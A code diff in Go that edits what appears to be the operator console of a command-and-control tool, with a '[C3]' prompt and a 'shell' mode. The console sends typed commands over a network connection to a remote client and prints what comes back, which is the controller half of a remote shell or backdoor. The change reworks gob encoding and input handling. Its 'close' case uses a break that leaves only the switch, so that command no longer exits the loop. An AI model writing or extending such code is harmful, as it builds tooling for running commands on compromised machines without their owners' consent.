@@ -15,21 +15,27 @@ import (
 
 
 func shell(conn net.Conn) {
+	enc := gob.NewEncoder(conn)
+	dec := gob.NewDecoder(conn)
+
 	for {
 		fmt.Printf(color.Green + "[shell]: " + color.Reset)
 		cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
-		enc := gob.NewEncoder(conn)
 
-		if strings.Compare(cmd, "close\n") == 0 {
+
+
+		switch {
+		case cmd == "\r":
+			continue
+		case cmd == "close\n":
 			enc.Encode(cmd)
 			break
+		default:
+			result := ""
+			enc.Encode(cmd)
+			dec.Decode(&result)
+			fmt.Println(string(result))
 		}
-
-		enc.Encode(cmd)
-
-		result, _ := bufio.NewReader(conn).ReadString('\n')
-		result = strings.TrimSuffix(result, "\n")
-		fmt.Println(string(result))
 	}
 	conn.Close()
 }
@@ -65,10 +71,11 @@ func handleConnection(conn net.Conn) {
 	for {
 		fmt.Printf(color.Blue + "[C3]: " + color.Reset)
 		reader, _ := bufio.NewReader(os.Stdin).ReadString('\n')
-		//reader = strings.TrimSuffix(reader, "\n")
+		reader = strings.TrimSuffix(reader, "\n")
 
 		switch {
 		case reader == "\r\n":
+			continue
 		case reader == "exit":
 			exit(conn)
 		case reader == "shell":
